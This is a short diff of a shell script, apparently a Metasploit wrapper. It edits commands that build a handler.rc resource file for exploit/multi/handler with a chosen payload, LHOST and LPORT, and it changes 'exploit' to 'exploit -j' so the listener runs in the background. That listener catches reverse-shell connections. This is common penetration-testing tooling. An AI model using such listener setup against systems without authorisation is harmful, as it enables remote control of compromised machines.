@@ -417,7 +417,7 @@ echo "use exploit/multi/handler" >> resource/handler.rc
 echo "set PAYLOAD $payload" >> resource/handler.rc
 echo "set LHOST $ip" >>  resource/handler.rc
 echo "set LPORT $port" >>  resource/handler.rc
-echo "exploit " >>  resource/handler.rc
+echo "exploit -j " >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 #Select Y - - save the output as a custom file, and execute the MSF monitor module
 elif [ "$ps1" == "n" ]; then
@@ -425,7 +425,7 @@ echo "use exploit/multi/handler" >> resource/handler.rc
 echo "set PAYLOAD $payload" >> resource/handler.rc
 echo "set LHOST $ip" >>  resource/handler.rc
 echo "set LPORT $port" >>  resource/handler.rc
-echo "exploit " >>  resource/handler.rc
+echo "exploit -j" >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 fi
 #Select N, the MSF listening module will be executed directly
